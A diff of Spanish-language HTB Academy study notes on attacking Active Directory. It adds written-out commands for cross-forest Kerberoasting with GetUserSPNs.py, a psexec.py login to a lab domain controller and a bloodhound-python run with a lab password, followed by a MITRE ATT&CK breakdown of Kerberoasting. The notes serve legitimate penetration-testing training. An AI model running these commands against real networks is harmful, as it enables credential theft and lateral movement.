@@ -614,6 +614,7 @@ Ya sabes tiene para WinRM, PsExe y wmiexec ya lo documentaste en OSP notes.
 
 ```
  sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+
 # Esto ejecuto el colector ahora vamos con la otra parte
 
 sudo neo4j startn # Para inciar el servico de la base de datos
@@ -1982,10 +1983,28 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 
 ## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
+> As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account.
 
+```
+# Para obtener los SPN
 
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
 
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+# 
 
+psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -k -target-ip 172.16.5.238
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6f01b700-343a-494b-9473-95623516f25c)
+
+## Desglose de MITRE ATT&CK
+
+El mitre primero son las tacticas y despues las tecnicas.
+
+> Quería tomarme un segundo para mostrarles a todos cómo aparece al explorar el marco de ATT&CK. Usaremos el ejemplo anterior para Kerberoastingverlo a través de la lente del marco. Kerberoasting es parte del más grande Tactic tag TA0006 Credential Access(cuadrado verde en la imagen de arriba). Las tácticas abarcan el objetivo general del actor y contendrán varias técnicas que se relacionan con ese objetivo. Dentro de este ámbito, verá todo tipo de técnicas de robo de credenciales. Podemos desplazarnos hacia abajo y buscar Steal or Forge Kerberos Tickets, que es Technique Tag T1558(cuadrado azul en la imagen de arriba). Esta técnica contiene cuatro subtécnicas (indicadas al .00#lado del nombre de la técnica): Golden Ticket, Silver Ticket, Kerberoasting y AS-REP Roasting. Como nos preocupamos por Kerberoasting, seleccionaremos la subtécnica T1558.003(cuadro naranja en la imagen de arriba) y nos llevará a una nueva página. Aquí podemos ver una explicación general de la técnica, la información que hace referencia a la clasificación de la plataforma ATT&CK en la parte superior derecha, ejemplos de su uso en el mundo real, formas de mitigar y detectar la táctica y, finalmente, referencias para obtener más información en el final de la página.
+
+> Entonces nuestra técnica se clasificaría en TA0006/T1558.003. Así es como se leería el árbol Táctica/Técnica. Hay muchas formas diferentes de navegar por el marco. Solo queríamos brindar algunas aclaraciones sobre lo que estábamos buscando y cómo definimos tácticas versus técnicas cuando hablamos de MITRE ATT&CK en este módulo. Este marco es excelente para explorar si tiene curiosidad acerca de un Tactico Techniquey desea obtener más información al respecto.
 
 
 
